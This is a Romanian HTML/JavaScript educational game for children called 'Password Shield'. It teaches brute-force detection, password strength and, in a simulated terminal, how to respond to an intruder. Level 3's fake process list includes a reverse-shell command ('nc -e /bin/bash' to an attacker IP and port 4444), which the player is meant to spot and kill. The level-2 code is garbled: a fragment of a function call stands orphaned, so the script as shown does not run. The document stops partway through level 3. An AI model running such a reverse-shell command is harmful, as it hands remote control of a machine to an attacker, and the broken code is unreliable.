<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Shield - CyberShield Academy</title>
    <style>
        body {
            background-color: #11111b;
            color: #cdd6f4;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 30px;
            background-color: #11111b;
            border-bottom: 2px solid #00ff88;
        }

        #player-info {
            font-size: 18px;
            font-weight: bold;
            color: #00ff88;
        }

        h2 { color: #00ff88; text-align: center; }
        .sub { text-align: center; color: #a6adc8; margin-top: -8px; margin-bottom: 18px; }

        /* ---------- Hartă niveluri ---------- */
        .level-row { display: flex; justify-content: center; gap: 20px; margin-top: 30px; flex-wrap: wrap; }
        .level-btn {
            width: 90px; height: 90px; border: none; border-radius: 15px;
            font-size: 22px; font-weight: bold; cursor: pointer; transition: all 0.3s ease;
        }
        .level-btn.unlocked { background: #00ff88; color: #11111b; box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4); }
        .level-btn.unlocked:hover { transform: translateY(-6px) scale(1.05); box-shadow: 0 10px 30px rgba(0, 255, 136, 0.5); }
        .level-btn.locked { background: #313244; color: #a6adc8; cursor: not-allowed; opacity: 0.6; }
        .level-label { font-size: 13px; color: #a6adc8; text-align: center; margin-top: 8px; width: 110px; }
        .level-col { display: flex; flex-direction: column; align-items: center; }

        .back-btn { background: transparent; border: 1px solid #45475a; color: white; padding: 8px 15px; border-radius: 6px; cursor: pointer; }
        .back-btn:hover { border-color: #00ff88; color: #00ff88; }

        /* ---------- Elemente comune ---------- */
        .card { background: #1e1e2e; border: 2px solid #45475a; border-radius: 12px; padding: 14px 18px; margin-bottom: 14px; }
        .card .top { display: flex; align-items: center; gap: 14px; }
        .card .icon { font-size: 34px; }
        .card .title { font-weight: bold; font-size: 17px; }
        .card .meta { color: #a6adc8; font-size: 14px; margin-top: 3px; }
        .card .btns { display: flex; gap: 10px; margin-top: 12px; }
        .card.right { border-color: #00ff88; }
        .card.wrong { border-color: #f9e2af; }
        .fb { margin-top: 10px; font-size: 14px; line-height: 1.4; }

        button.act { flex: 1; background: #313244; color: #cdd6f4; border: 2px solid #45475a; border-radius: 8px; padding: 10px; font-size: 15px; cursor: pointer; transition: all .2s; }
        button.act:hover:not(:disabled) { border-color: #00ff88; color: #00ff88; transform: translateY(-2px); }
        button.act:disabled { opacity: .5; cursor: default; }
        button.main { display: block; margin: 20px auto 0; background: #00ff88; color: #11111b; border: none; border-radius: 10px; padding: 12px 28px; font-size: 17px; font-weight: bold; cursor: pointer; }

        .opt { display: block; width: 100%; text-align: left; background: #1e1e2e; color: #cdd6f4; border: 2px solid #45475a; border-radius: 12px; padding: 16px; margin-bottom: 12px; font-size: 16px; cursor: pointer; transition: all .2s; }
        .opt:hover:not(:disabled) { border-color: #00ff88; transform: translateY(-3px); box-shadow: 0 8px 20px rgba(0,255,136,.3); }
        .opt.good { border-color: #00ff88; background: #17281f; }
        .opt.bad { border-color: #f38ba8; }
        #qfb { text-align: center; margin-top: 10px; line-height: 1.4; }
        .stars { font-size: 44px; text-align: center; margin: 10px 0; }

        .steps { display: flex; justify-content: center; gap: 10px; margin: 5px 0 15px; font-size: 14px; flex-wrap: wrap; }
        .step { padding: 6px 14px; border-radius: 20px; background: #313244; color: #a6adc8; }
        .step.active { background: #00ff88; color: #11111b; font-weight: bold; }
        .step.done { background: #1e1e2e; color: #00ff88; border: 1px solid #00ff88; }

        /* ---------- Nivelul 2: parola ---------- */
        #pw-input { width: 100%; box-sizing: border-box; background: #11111b; color: #cdd6f4; border: 2px solid #45475a; border-radius: 10px; padding: 14px; font-size: 18px; outline: none; }
        #pw-input:focus { border-color: #00ff88; }
        .meter { background: #313244; border-radius: 8px; height: 22px; overflow: hidden; margin: 14px 0 6px; }
        #meter-fill { height: 100%; width: 0%; background: #f38ba8; transition: all .3s; }
        #pw-time { text-align: center; font-size: 18px; margin: 8px 0; }
        .tip { margin: 6px 0; color: #6c7086; font-size: 15px; }
        .tip.ok { color: #00ff88; }

        /* ---------- Nivelul 3: terminal ---------- */
        #desktop { padding: 15px; border-radius: 12px; border: 2px solid #45475a; background: linear-gradient(135deg,#181825,#1e1e2e); display: flex; gap: 15px; min-height: 480px; }
        .window { background: #11111b; border: 1px solid #45475a; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; }
        .titlebar { background: #313244; padding: 6px 12px; font-size: 13px; color: #a6adc8; display: flex; justify-content: space-between; }
        #terminal-win { flex: 2; min-width: 0; }
        #side { flex: 1; display: flex; flex-direction: column; gap: 15px; min-width: 240px; }
        #term-out { flex: 1; padding: 10px; overflow-y: auto; height: 380px; font-family: "Courier New", monospace; font-size: 13px; line-height: 1.4; }
        #term-out div { white-space: pre-wrap; word-break: break-all; }
        .tok { color: #00ff88; } .tbad { color: #f38ba8; } .tdim { color: #6c7086; } .twarn { color: #f9e2af; }
        #term-in-row { display: flex; border-top: 1px solid #313244; padding: 8px 10px; font-family: "Courier New", monospace; font-size: 13px; }
        #prompt { color: #00ff88; margin-right: 8px; white-space: nowrap; }
        #term-in { flex: 1; min-width: 0; background: transparent; border: none; outline: none; color: #cdd6f4; font-family: inherit; font-size: inherit; }
        .panel-body { padding: 12px; font-size: 13px; }
        .bar { background: #313244; border-radius: 6px; height: 18px; overflow: hidden; margin: 8px 0; }
        #stolen-fill { height: 100%; width: 0%; background: #f38ba8; transition: width .5s; }
        .check { margin: 6px 0; color: #6c7086; }
        .check.done { color: #00ff88; }
        #alerts div { margin: 4px 0; color: #f9e2af; }

        @media (max-width: 760px) {
            header { flex-direction: column; gap: 6px; padding: 12px 16px; }
            #desktop { flex-direction: column; }
            #side { min-width: 0; }
        }
    </style>
</head>
<body>
    <!-- 1. Header (Bara de sus) -->
    <header>
        <h1>🛡️ Cyber Defenders</h1>
        <div id="player-info">
            <span id="display-name">Jucător: Anonim</span> |
            <span id="display-score">Scor: 0</span>
        </div>
    </header>

    <!-- 2. Main Content Container -->
    <main id="app-container" style="padding: 20px; max-width: 900px; margin: 0 auto;">

        <!-- Mascota CyberBot -->
        <div id="mascot-box" style="display: flex; align-items: center; background: #1e1e2e; border: 1px solid #00ff88; padding: 15px; border-radius: 10px; margin-bottom: 25px;">
            <div style="font-size: 40px; margin-right: 15px;">🤖</div>
            <div>
                <strong style="color:#00ff88;">Cyberbot:</strong>
                <p id="mascot-text" style="margin: 5px 0 0 0; color: #cdd6f4;"></p>
            </div>
        </div>

        <!-- HARTA CU NIVELURI -->
        <div id="level-select" style="text-align: center; margin-top: 20px;">
            <a href="index.html" class="back-btn" style="float: left; text-decoration: none;">⬅ Înapoi la Meniu</a>
            <h2 id="adventure-title" style="clear: both; padding-top: 10px;">🔑 Password Shield - Selectează Nivelul</h2>
            <div class="level-row" id="level-row"></div>
        </div>

        <!-- ZONA UNDE RULEAZĂ NIVELUL ALES -->
        <div id="level-stage" style="display: none;"></div>
    </main>

    <!-- 3. Logică JavaScript -->
    <script>
        // ================= Bază: nume, scor, progres =================
        let nume = null;
        try { nume = localStorage.getItem("cs_nume"); } catch (e) {}
        if (!nume) {
            try { nume = prompt("Introdu numele tău de detectiv:"); } catch (e) {}
            if (nume) { try { localStorage.setItem("cs_nume", nume); } catch (e) {} }
        }
        if (nume) document.querySelector("#display-name").textContent = "Jucător: " + nume;

        let score = 0;
        let unlocked = 1;
        try {
            const u = parseInt(localStorage.getItem("ps_unlocked"), 10);
            if (u >= 1 && u <= 3) unlocked = u;
            const s = parseInt(localStorage.getItem("ps_score"), 10);
            if (s > 0) score = s;
        } catch (e) {}
        function showScore() { document.querySelector("#display-score").textContent = "Scor: " + score; }
        showScore();
        function addScore(n) {
            score += n; showScore();
            try { localStorage.setItem("ps_score", String(score)); } catch (e) {}
        }

        const levelSelect = document.querySelector("#level-select");
        const levelStage = document.querySelector("#level-stage");
        const levelRow = document.querySelector("#level-row");
        const mascotText = document.querySelector("#mascot-text");
        function say(t) { mascotText.textContent = t; }

        function el(tag, cls, text) {
            const e = document.createElement(tag);
            if (cls) e.className = cls;
            if (text) e.textContent = text;
            return e;
        }

        let cleanup = null; // oprește cronometrele nivelului curent
        function leaveLevel() {
            if (cleanup) { cleanup(); cleanup = null; }
            levelStage.style.display = "none";
            levelStage.textContent = "";
            levelSelect.style.display = "block";
            renderMap();
            say("Bine ai revenit pe hartă! Alege un nivel.");
        }

        function completeLevel(n, points) {
            addScore(points);
            if (unlocked < n + 1 && n < 3) {
                unlocked = n + 1;
                try { localStorage.setItem("ps_unlocked", String(unlocked)); } catch (e) {}
            }
            // hook pentru pagina principală
            if (window.onPasswordShieldFinish) window.onPasswordShieldFinish(true, score);
        }

        function openLevel(n) {
            levelSelect.style.display = "none";
            levelStage.style.display = "block";
            levelStage.textContent = "";
            const back = el("button", "back-btn", "⬅ Înapoi la niveluri");
            back.onclick = leaveLevel;
            levelStage.appendChild(back);
            const body = el("div"); body.style.maxWidth = "760px"; body.style.margin = "0 auto";
            if (n === 3) body.style.maxWidth = "none";
            levelStage.appendChild(body);
            if (n === 1) startLevel1(body);
            else if (n === 2) startLevel2(body);
            else startLevel3(body);
        }

        const levelInfo = [
            { n: 1, label: "Detectivul începător" },
            { n: 2, label: "Construiește parola" },
            { n: 3, label: "Terminal: apără serverul" }
        ];
        function renderMap() {
            levelRow.textContent = "";
            levelInfo.forEach(function (info) {
                const col = el("div", "level-col");
                const b = el("button", "level-btn");
                if (info.n <= unlocked) {
                    b.classList.add("unlocked");
                    b.textContent = info.n + (info.n < unlocked ? " ✅" : " ⭐");
                    b.onclick = function () { openLevel(info.n); };
                } else {
                    b.classList.add("locked");
                    b.textContent = "🔒 " + info.n;
                }
                col.appendChild(b);
                col.appendChild(el("div", "level-label", info.label));
                levelRow.appendChild(col);
            });
        }

        // ================= Funcții comune pentru întrebări =================
        function stepsBar(parent, labels) {
            const bar = el("div", "steps");
            labels.forEach(function (l) { bar.appendChild(el("div", "step", l)); });
            parent.appendChild(bar);
            return function (n) {
                Array.prototype.forEach.call(bar.children, function (c, i) {
                    c.className = "step" + (i + 1 < n ? " done" : i + 1 === n ? " active" : "");
                });
            };
        }

        function question(body, setStep, stepNo, title, sub, botText, options, correctIdx, goodText, next, nextLabel) {
            setStep(stepNo); body.textContent = ""; say(botText);
            body.appendChild(el("h2", "", title));
            body.appendChild(el("p", "sub", sub));
            let tries = 0, solved = false;
            const fb = el("div"); fb.id = "qfb";
            options.forEach(function (o, i) {
                const b = el("button", "opt", o.text);
                b.onclick = function () {
                    if (solved) return;
                    tries++;
                    if (i === correctIdx) {
                        solved = true; b.classList.add("good");
                        if (tries === 1) addScore(200);
                        fb.textContent = "✔ " + goodText; fb.style.color = "#00ff88";
                        const go = el("button", "main", nextLabel); go.onclick = next;
                        body.appendChild(go); go.scrollIntoView({ behavior: "smooth" });
                    } else {
                        b.classList.add("bad"); b.disabled = true;
                        fb.textContent = "✘ " + o.why + " Încearcă din nou!"; fb.style.color = "#f9e2af";
                    }
                };
                body.appendChild(b);
            });
            body.appendChild(fb);
        }

        function resultScreen(body, title, starsCount, scoreText, lessonText, botText, onAgain) {
            body.textContent = ""; say(botText);
            body.appendChild(el("h2", "", title));
            body.appendChild(el("div", "stars", "⭐".repeat(starsCount) + "☆".repeat(3 - starsCount)));
            body.appendChild(el("p", "sub", scoreText));
            const lesson = el("div", "card");
            lesson.appendChild(el("div", "title", "Ce ai învățat"));
            lesson.appendChild(el("div", "fb", lessonText));
            body.appendChild(lesson);
            const again = el("button", "main", "Joacă din nou");
            again.onclick = onAgain;
            body.appendChild(again);
            const back = el("button", "main", "Înapoi la niveluri");
            back.style.background = "transparent"; back.style.color = "#00ff88"; back.style.border = "1px solid #00ff88";
            back.onclick = leaveLevel;
            body.appendChild(back);
        }

        // ================= NIVELUL 1: Detectivul începător =================
        const l1cards = [
            { icon: "👩‍🏫", title: "Prof. Elena s-a conectat", meta: "09:02 · Sibiu · laptopul ei obișnuit", sus: false,
              why: "Persoană cunoscută, loc cunoscut, dispozitiv cunoscut. Totul e normal." },
            { icon: "🧑", title: "Tu ai greșit parola o dată, apoi ai scris-o corect", meta: "09:15 · Sibiu · telefonul tău", sus: false,
              why: "O singură greșeală de tastare e normal. Oricui i se întâmplă!" },
            { icon: "🕵️", title: "Cineva necunoscut a încercat 14 parole în 20 de secunde", meta: "03:14 noaptea · țară necunoscută · dispozitiv nou", sus: true,
              why: "Un om nu poate scrie 14 parole în 20 de secunde. Acesta este un program care ghicește parole: se numește atac prin forță brută." },
            { icon: "🕵️", title: "Aceeași persoană necunoscută s-a conectat în contul „admin”", meta: "03:15 noaptea · țară necunoscută · dispozitiv nou", sus: true,
              why: "Programul a ghicit parola! Acum intrusul este în interiorul contului." },
            { icon: "🤖", title: "Copie de siguranță automată (backup)", meta: "02:00 · serverul școlii · rulează în fiecare noapte", sus: false,
              why: "Se întâmplă în fiecare noapte, la aceeași oră, de la serverul școlii. E normal." },
            { icon: "📧", title: "Școala te anunță că parola ta a fost schimbată", meta: "ieri, 17:30 · la cererea ta", sus: false,
              why: "Tu ai cerut schimbarea, deci este în regulă." }
        ];

        function startLevel1(body) {
            const setStep = stepsBar(body.parentNode.insertBefore(el("div"), body), ["1 · Găsește intrusul", "2 · Acționează", "3 · Parola puternică"]);

            function p1() {
                setStep(1); body.textContent = "";
                say("Alertă! Cineva ar putea încerca să intre în contul școlii. Uită-te la fiecare eveniment și spune-mi: e în regulă sau e suspect? Nu te grăbi!");
                body.appendChild(el("h2", "", "🔎 Jurnalul de activitate"));
                body.appendChild(el("p", "sub", "Apasă „Suspect” sau „În regulă” pentru fiecare eveniment."));
                let decided = 0;
                l1cards.forEach(function (c) {
                    const box = el("div", "card");
                    const top = el("div", "top");
                    top.appendChild(el("div", "icon", c.icon));
                    const txt = el("div");
                    txt.appendChild(el("div", "title", c.title));
                    txt.appendChild(el("div", "meta", c.meta));
                    top.appendChild(txt);
                    box.appendChild(top);
                    const btns = el("div", "btns");
                    const bSus = el("button", "act", "🚩 Suspect");
                    const bOk = el("button", "act", "✅ În regulă");
                    btns.appendChild(bSus); btns.appendChild(bOk);
                    box.appendChild(btns);
                    const fb = el("div", "fb"); box.appendChild(fb);
                    function answer(saidSus) {
                        bSus.disabled = true; bOk.disabled = true;
                        const correct = (saidSus === c.sus);
                        box.classList.add(correct ? "right" : "wrong");
                        fb.textContent = (correct ? "✔ Corect! " : "✘ Aproape! ") + c.why;
                        fb.style.color = correct ? "#00ff88" : "#f9e2af";
                        if (correct) addScore(100);
                        decided++;
                        if (decided === l1cards.length) {
                            say("Ai terminat de verificat! Intrusul este în interiorul contului „admin”. Trebuie să acționăm acum!");
                            const go = el("button", "main", "Continuă ➜");
                            go.onclick = p2;
                            body.appendChild(go);
                            go.scrollIntoView({ behavior: "smooth" });
                        }
                    }
                    bSus.onclick = function () { answer(true); };
                    bOk.onclick = function () { answer(false); };
                    body.appendChild(box);
                });
            }

            const baseQuestion = question;

            function p2() {
                baseQuestion(body, setStep, 2, "🚨 Intrusul este în cont!", "Care este primul lucru pe care îl faci?",
                    "Intrusul poate vedea fișierele! Alege cu grijă ce faci primul.",
                    [
                        { text: "😴 Aștept, poate pleacă singur", why: "Nu pleacă singur: cât aștepți, poate copia sau șterge date." },
                        { text: "🔒 Schimb imediat parola contului „admin” și deconectez toate dispozitivele", why: "" },
                        { text: "📨 Trimit parola prietenilor ca să mă ajute", why: "Niciodată nu trimite parola nimănui! Ai da cheia casei încă unei persoane." }
                    ], 1,
                    "Exact! Schimbarea parolei îl scoate pe intrus afară, iar deconectarea dispozitivelor îl închide în afara contului.",
                    p3, "Continuă ➜");
            }

            function p3() {
                baseQuestion(body, setStep, 3, "💪 Alege parola cea mai puternică", "Intrusul a ghicit parola veche. Alege una pe care un program nu o poate ghici ușor.",
                    "Ultimul pas! Parola veche era prea ușoară. Care dintre aceste parole este cea mai greu de spart?",
                    [
                        { text: "parola123", why: "Este foarte scurtă și conține un cuvânt obișnuit; un program o ghicește în câteva secunde." },
                        { text: "Sibiu2024", why: "Pare bună, dar este numele orașului plus un an. Programele încearcă astfel de combinații primele." },
                        { text: "Pisica-Albastra-Mananca-7-Mere!", why: "" }
                    ], 2,
                    "Corect! O parolă lungă, făcută din mai multe cuvinte, este mult mai greu de spart decât una scurtă și complicată. Un truc bun: gândește-te la o propoziție amuzantă pe care doar tu o știi.",
                    fin, "Vezi rezultatul ➜");
            }

            function fin() {
                // scorul vizibil crește deja prin addScore; aici doar marcăm nivelul ca terminat
                const total = Math.min(1000, scoreSinceStart());
                const stars = total >= 900 ? 3 : total >= 600 ? 2 : 1;
                completeLevel(1, 0);
                resultScreen(body, "🛡️ Cont salvat!", stars, "Punctaj în acest nivel: " + total + " din 1000",
                    "Un atac prin forță brută încearcă foarte multe parole într-un timp foarte scurt. Te aperi cu parole lungi, făcute din mai multe cuvinte, pe care nu le folosești în alte locuri, și nu le dai niciodată altcuiva.",
                    "Bravo, detectivule! Ai oprit intrusul și ai învățat cum să te aperi. Nivelul 2 este deblocat!",
                    function () { openLevel(1); });
            }

            const scoreAtStart = score;
            function scoreSinceStart() { return score - scoreAtStart; }

            p1();
        }

        // ================= NIVELUL 2: Construiește parola =================
        const COMMON = ["parola", "password", "123456", "12345", "qwerty", "admin", "sibiu", "iloveyou", "abc123", "111111", "000000", "letmein", "welcome", "romania"];

        function crackSeconds(pw) {
            if (!pw) return 0;
            let pool = 0;
            if (/[a-z]/.test(pw)) pool += 26;
            if (/[A-Z]/.test(pw)) pool += 26;
            if (/[0-9]/.test(pw)) pool += 10;
            if (/[^A-Za-z0-9]/.test(pw)) pool += 32;
            let len = pw.length;
            // caractere repetate (aaa) nu adaugă siguranță reală
            const repeats = (pw.match(/(.)\1{2,}/g) || []).join("").length;
            len -= repeats * 0.7;
            let secs = Math.pow(pool, Math.max(len, 0)) / 1e10; // 10 miliarde de încercări/secundă
            const low = pw.toLowerCase();
            const isCommon = COMMON.some(function (w) { return low.indexOf(w) > -1; });
            if (isCommon) secs = Math.min(secs, 5); // parolele comune se ghicesc imediat
            return secs;
        }

        function fmtTime(s) {
            if (s < 1) return "mai puțin de o secundă";
            if (s < 60) return Math.round(s) + " secunde";
            if (s < 3600) return Math.round(s / 60) + " minute";
            if (s < 86400) return Math.round(s / 3600) + " ore";
            if (s < 86400 * 365) return Math.round(s / 86400) + " zile";
            const y = s / (86400 * 365);
            if (y < 1000) return Math.round(y) + " ani";
            if (y < 1e6) return "peste " + Math.floor(y / 1000) + " mii de ani";
            if (y < 1e9) return "peste " + Math.floor(y / 1e6) + " milioane de ani";
            return "miliarde de ani";
        }

        function startLevel2(body) {
            say("Acum e rândul tău! Scrie o parolă nouă și uită-te cât timp i-ar trebui unui program să o spargă. Scopul: cel puțin 100 de ani.");
            body.appendChild(el("h2", "", "🔨 Construiește o parolă puternică"));
            body.appendChild(el("p", "sub", "Scrie o parolă de probă (NU parola ta reală!) și urmărește bara."));

            const input = el("input"); input.id = "pw-input"; input.type = "text"; input.placeholder = "Scrie parola de probă aici…";
            input.setAttribute("autocomplete", "off"); input.setAttribute("spellcheck", "false");
            body.appendChild(input);

            const meter = el("div", "meter"); const fill = el("div"); fill.id = "meter-fill"; meter.appendChild(fill);
            body.appendChild(meter);
            const time = el("div"); time.id = "pw-time"; time.textContent = "Timp de spargere: -";
            body.appendChild(time);

            const tips = [
                { t: "Are cel puțin 12 caractere", f: function (p) { return p.length >= 12; } },
                { t: "Are litere mari și mici", f: function (p) { return /[a-z]/.test(p) && /[A-Z]/.test(p); } },
                { t: "Are cel puțin o cifră sau un semn (ex: 7 sau !)", f: function (p) { return /[0-9]/.test(p) || /[^A-Za-z0-9]/.test(p); } },
                { t: "Nu conține cuvinte foarte comune (parola, admin, sibiu, 123456…)", f: function (p) { var l = p.toLowerCase(); return p.length > 0 && !COMMON.some(function (w) { return l.indexOf(w) > -1; }); } }
            ];
            const tipEls = tips.map(function (x) { const d = el("div", "tip", "⬜ " + x.t); body.appendChild(d); return d; });

            const hint = el("div", "fb", "Idee: gândește-te la o propoziție amuzantă și leag-o cu cratime, de exemplu trei-patru cuvinte care nu au legătură între ele.");
            hint.style.textAlign = "center"; hint.style.marginTop = "12px"; hint.style.color = "#a6adc8";
            body.appendChild(hint);

            const goal = 100 * 86400 * 365;
            let won = false;
            input.addEventListener("input", function () {
                const p = input.value;
                const s = crackSeconds(p);
                const pct = Math.max(0, Math.min(100, (Math.log10(Math.max(s, 1)) / Math.log10(goal)) * 100));
                fill.style.width = pct + "%";
                fill.style.background = pct < 35 ? "#f38ba8" : pct < 75 ? "#f9e2af" : "#00ff88";
                time.textContent = p ? "Timp de spargere: " + fmtTime(s) : "Timp de spargere: -";
                tips.forEach(function (x, i) {
                    const ok = x.f(p);
                    tipEls[i].className = "tip" + (ok ? " ok" : "");
                    tipEls[i].textContent = (ok ? "✅ " : "⬜ ") + x.t;
                });
                if (!won && s >= goal && tips.every(function (x) { return x.f(p); })) {
                    won = true; input.disabled = true;
                    say("Fantastic! Parola ta ar rezista sute de ani în fața unui program. Reține: o parolă lungă bate o parolă complicată dar scurtă.");

                            "Nivelul 3 este deblocat, dar e o provocare serioasă. Ești pregătit?",
                            function () { openLevel(2); });
                    };
                    body.appendChild(go); go.scrollIntoView({ behavior: "smooth" });
                }
            });
            input.focus();
        }

        // ================= NIVELUL 3: Terminal (avansat) =================
        function startLevel3(body) {
            say("Alertă roșie! Cineva a intrat pe serverul școlii. Deschide terminalul, scrie help și găsește intrusul înainte să fure datele!");
            body.innerHTML =
                '<div id="desktop">' +
                  '<div class="window" id="terminal-win">' +
                    '<div class="titlebar"><span>🖥️ Terminal - admin@cyber-srv01</span><span>● ● ●</span></div>' +
                    '<div id="term-out"></div>' +
                    '<div id="term-in-row"><span id="prompt">admin@cyber-srv01:~$</span><input id="term-in" autocomplete="off" spellcheck="false"></div>' +
                  '</div>' +
                  '<div id="side">' +
                    '<div class="window"><div class="titlebar"><span>📡 Monitor de securitate</span></div>' +
                      '<div class="panel-body"><div>Date furate: <b id="stolen-pct">0%</b></div>' +
                      '<div class="bar"><div id="stolen-fill"></div></div><div id="alerts"></div></div></div>' +
                    '<div class="window"><div class="titlebar"><span>✅ Misiune</span></div>' +
                      '<div class="panel-body">' +
                      '<div class="check" id="c-ip">⬜ Blochează IP-ul atacatorului</div>' +
                      '<div class="check" id="c-pid">⬜ Oprește procesul malițios</div>' +
                      '<div class="check" id="c-user">⬜ Blochează contul compromis</div>' +
                      '</div></div>' +
                  '</div>' +
                '</div>' +
                '<div id="l3-result"></div>';

            const ATTACKER = "185.220.101.47", FRIEND = "10.0.0.5";
            const BAD_PID = 4821, GOOD_PID = 902, COMPROMISED = "admin";

            const logLines = [
                "Oct 21 19:48:02 srv01 sshd[611]: Accepted password for student from " + FRIEND + " port 51122 ssh2",
                "Oct 21 19:51:40 srv01 sshd[640]: Failed password for student from " + FRIEND + " port 51190 ssh2",
                "Oct 21 19:51:46 srv01 sshd[640]: Accepted password for student from " + FRIEND + " port 51194 ssh2",
                "Oct 21 19:58:10 srv01 CRON[702]: (root) CMD (/opt/backup.sh --nightly)",
                "Oct 21 20:01:03 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40211 ssh2",
                "Oct 21 20:01:05 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40213 ssh2",
                "Oct 21 20:01:06 srv01 sshd[755]: Failed password for root from " + ATTACKER + " port 40215 ssh2",
                "Oct 21 20:01:08 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40217 ssh2",
                "Oct 21 20:01:09 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40219 ssh2",
                "Oct 21 20:01:11 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40221 ssh2",
                "Oct 21 20:01:12 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40223 ssh2",
                "Oct 21 20:01:14 srv01 sshd[755]: Failed password for admin from " + ATTACKER + " port 40225 ssh2",
                "Oct 21 20:01:15 srv01 sshd[760]: Accepted password for admin from " + ATTACKER + " port 40227 ssh2",
                "Oct 21 20:01:16 srv01 sshd[760]: pam_unix(sshd:session): session opened for user admin"
            ];
            let liveSecond = 20;
            const processes = [
                "  PID USER   COMMAND",
                "    1 root   /sbin/init",
                "  212 root   /usr/sbin/sshd",
                "  388 www    /usr/sbin/apache2",
                "  " + GOOD_PID + " root   /bin/bash /opt/backup.sh --nightly",
                " " + BAD_PID + " admin  nc -e /bin/bash " + ATTACKER + " 4444"
            ];
            const connections = [
                "Proto  Local Address        Foreign Address         State        PID",
                "tcp    0.0.0.0:22           0.0.0.0:*               LISTEN       212",
                "tcp    0.0.0.0:80           0.0.0.0:*               LISTEN       388",
                "tcp    10.0.0.2:22          " + FRIEND + ":51194          ESTABLISHED  611",
                "tcp    10.0.0.2:38812       " + ATTACKER + ":4444      ESTABLISHED  " + BAD_PID
            ];

            let blocked = false, killed = false, locked = false;
            let stolen = 0, pts = 1000, mistakes = 0, over = false;
            const hist = []; let hIdx = 0;

            const out = document.getElementById("term-out");
            const input = document.getElementById("term-in");

            function print(text, cls) {
                const d = document.createElement("div");
                d.textContent = text;
                if (cls) d.className = cls;
                out.appendChild(d);
                out.scrollTop = out.scrollHeight;
            }
            function alertMsg(t) {
                const d = document.createElement("div"); d.textContent = "⚠ " + t;
                const a = document.getElementById("alerts"); a.prepend(d);
                while (a.children.length > 3) a.removeChild(a.lastChild);
            }
            function mistake(msg) {
                mistakes++; pts = Math.max(0, pts - 150);
                print(msg, "tbad");
                say("Ai greșit: acțiunea nu a oprit atacul. Verifică mai bine dovezile din loguri!");
            }
            function mark(id, text) {
                const e = document.getElementById(id); e.classList.add("done"); e.textContent = "✅ " + text;
            }

            const commands = {
                help: function () {
                    print("Comenzi disponibile:", "tok");
                    print("  ls                   - listează fișierele");
                    print("  cat auth.log         - citește jurnalul de autentificare");
                    print("  cat notes.txt        - citește notițele administratorului");
                    print("  grep <text> auth.log - caută în jurnal (ex: grep Failed auth.log)");
                    print("  who                  - cine este conectat acum");
                    print("  ps                   - procesele care rulează");
                    print("  netstat              - conexiunile de rețea");
                    print("  block <ip>           - blochează o adresă IP în firewall");
                    print("  kill <pid>           - oprește un proces");
                    print("  lock <user>          - blochează un cont de utilizator");
                    print("  clear                - curăță ecranul");
                },
                ls: function () { print("auth.log   notes.txt   backup.sh"); },
                who: function () { print("student   pts/0   " + FRIEND); print(COMPROMISED + "     pts/1   " + ATTACKER, "tdim"); },
                ps: function () { processes.forEach(function (l) { print(l); }); },
                netstat: function () { connections.forEach(function (l) { print(l); }); },
                cat: function (args) {
                    if (args[0] === "auth.log") logLines.forEach(function (l) { print(l, l.indexOf("Failed") > -1 ? "twarn" : ""); });
                    else if (args[0] === "notes.txt") print("Notă: profesorul se conectează de pe " + FRIEND + ". Rulează backup.sh noaptea.");
                    else print("cat: fișier inexistent", "tbad");
                },
                grep: function (args) {
                    if (args.length < 2 || args[1] !== "auth.log") { print("Utilizare: grep <text> auth.log", "tbad"); return; }
                    const found = logLines.filter(function (l) { return l.indexOf(args[0]) > -1; });
                    if (!found.length) print("(nimic găsit)", "tdim");
                    found.forEach(function (l) { print(l); });
                },
                block: function (args) {
                    const ip = args[0];
                    if (!ip) { print("Utilizare: block <ip>", "tbad"); return; }
                    if (ip === ATTACKER) {
                        if (blocked) { print("IP-ul este deja blocat.", "tdim"); return; }
                        blocked = true; print("Firewall: " + ip + " blocat. ✔", "tok"); mark("c-ip", "IP-ul atacatorului blocat");
                        say("Bine! Atacatorul nu mai poate încerca parole noi. Dar e încă în sistem, verifică procesele!");
                    } else if (ip === FRIEND) mistake("Ai blocat un utilizator legitim (profesorul)! -150 puncte");
                    else mistake("Acel IP nu apare în nicio activitate suspectă. -150 puncte");
                    checkWin();
                },
                kill: function (args) {
                    const pid = parseInt(args[0], 10);
                    if (!pid) { print("Utilizare: kill <pid>", "tbad"); return; }
                    if (pid === BAD_PID) {
                        if (killed) { print("Procesul nu mai există.", "tdim"); return; }
                        killed = true; print("Proces " + pid + " oprit. ✔", "tok"); mark("c-pid", "Procesul malițios oprit");
                        say("Excelent! Conexiunea de furt de date s-a închis. Nu uita de contul compromis!");
                    } else if (pid === GOOD_PID) mistake("Ai oprit backup-ul legitim! -150 puncte");
                    else mistake("Procesul " + pid + " nu este malițios. -150 puncte");
                    checkWin();
                },
                lock: function (args) {
                    const u = args[0];
                    if (!u) { print("Utilizare: lock <user>", "tbad"); return; }
                    if (u === COMPROMISED) {
                        if (locked) { print("Contul este deja blocat.", "tdim"); return; }
                        locked = true; print("Contul '" + u + "' blocat. ✔  (parola trebuie schimbată!)", "tok"); mark("c-user", "Contul compromis blocat");
                        say("Ai blocat contul! Parola lui era slabă, de aceea a fost spartă prin forță brută.");
                    } else mistake("Contul '" + u + "' nu a fost compromis. -150 puncte");
                    checkWin();
                },
                clear: function () { out.textContent = ""; }
            };

            function run(line) {
                print("admin@cyber-srv01:~$ " + line, "tdim");
                const parts = line.trim().split(/\s+/);
                const cmd = parts.shift();
                if (!cmd) return;
                if (Object.prototype.hasOwnProperty.call(commands, cmd)) commands[cmd](parts);
                else print(cmd + ": comandă necunoscută. Scrie 'help'.", "tbad");
            }

            input.addEventListener("keydown", function (e) {
                if (e.key === "Enter" && !over) {
                    const v = input.value; input.value = "";
                    if (v.trim()) { hist.push(v); hIdx = hist.length; }
                    run(v);
                } else if (e.key === "ArrowUp" && hIdx > 0) { hIdx--; input.value = hist[hIdx]; e.preventDefault(); }
                else if (e.key === "ArrowDown" && hIdx < hist.length - 1) { hIdx++; input.value = hist[hIdx]; }
            });
